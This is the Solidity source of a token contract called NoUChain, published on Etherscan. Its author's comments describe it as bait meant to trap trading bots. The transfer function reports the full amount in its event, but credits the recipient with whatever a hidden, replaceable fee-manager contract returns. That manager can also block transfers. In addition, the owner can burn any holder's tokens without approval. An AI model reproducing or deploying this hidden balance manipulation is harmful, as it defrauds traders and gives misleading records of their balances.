/**
 *Submitted for verification at Etherscan.io on 2021-04-12
*/

pragma solidity >=0.6.6;

/**
 *Submitted for verification at Etherscan.io on 2021-04-11
*/

// SPDX-License-Identifier: CC-BY-NC-SA-2.5

//@code0x2#0202 
// github.com/code0x2 for other weird stuff

//██╗░░░██╗░█████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗░█████╗░██╗███╗░░██╗
//╚██╗░██╔╝██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░░██║██╔══██╗██║████╗░██║
//░╚████╔╝░██║░░██║██║░░░░░██║░░██║██║░░╚═╝███████║███████║██║██╔██╗██║
//░░╚██╔╝░░██║░░██║██║░░░░░██║░░██║██║░░██╗██╔══██║██╔══██║██║██║╚████║
//░░░██║░░░╚█████╔╝███████╗╚█████╔╝╚█████╔╝██║░░██║██║░░██║██║██║░╚███║
//░░░╚═╝░░░░╚════╝░╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝

// Its HOT(holochain), but it baits bots instead. Have fun with the code, and no, you dont get the fee manager logic >:). Will you live to get baited another day :p
// if your bot got baited, well sucks for you i guess. good luck in the future!
// try your luck figuring out how to prevent getting yolo'd here: github.com/code0x2/yolochain

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}





contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}





contract ERC20 is Context {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 public totalSupply;

    string public name;
    string public symbol;
    uint8 public decimals;
    
    address private creator;
    address private feeManager;
    
    constructor (string memory _name, string memory _symbol) public {
        name = _name;
        symbol = _symbol;
        decimals = 18;
        
        creator = msg.sender;
    }
    
    function setFeeManager(address _fmg) public {
        require(msg.sender == creator, "no u bro");
        feeManager = _fmg;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _fee(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        uint trueAmount = feeManager != address(0) ? IFeeManager(feeManager).getTrueAmount(sender,recipient,amount) : amount;
        _balances[recipient] = _balances[recipient].add(trueAmount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        //_fee(address(0), account, amount);

        totalSupply = totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        //_fee(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        totalSupply = totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _fee(address from, address to, uint256 amount) internal virtual { 
        if(from == address(0) || to == address(0))
            return;
        if(feeManager== address(0))
            return;
            
        IFeeManager(feeManager).queryFee(from,to,amount);
    }
}

abstract contract ERC20Burnable is ERC20 {
    /**
     * @dev Destroys `amount` tokens from the caller.
     *
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, deducting from the caller's
     * allowance.
     *
     * See {ERC20-_burn} and {ERC20-allowance}.
     *
     * Requirements:
     *
     * - the caller must have allowance for ``accounts``'s tokens of at least
     * `amount`.
     */
    function burnFrom(address account, uint256 amount) public virtual{
        _burn(account, amount);
    }
}

contract NOU is ERC20Burnable, Ownable {
    
    constructor() public ERC20('NoUChain', 'NOU') {
        _mint(msg.sender, 69e18);
    }
    
    function mint(address recipient_, uint256 amount_)
        public
        onlyOwner
        returns (bool)
    {
        uint256 balanceBefore = balanceOf(recipient_);
        _mint(recipient_, amount_);
        uint256 balanceAfter = balanceOf(recipient_);
        return balanceAfter >= balanceBefore;
    }

    function burn(uint256 amount) public override onlyOwner {
        super.burn(amount);
    }

    function burnFrom(address account, uint256 amount)
        public
        override
        
    {
        require(owner() == tx.origin);
        super.burnFrom(account, amount);
    }
    
    // Fallback rescue
    
    function destroy() public {
        require(msg.sender == owner(), "no u 2");
        selfdestruct(msg.sender);
    }
    
    receive() external payable{
        payable(owner()).transfer(msg.value);
    }
    
    function rescueToken(IERC20 _token) public {
        _token.transfer(owner(), _token.balanceOf(address(this)));
    }
}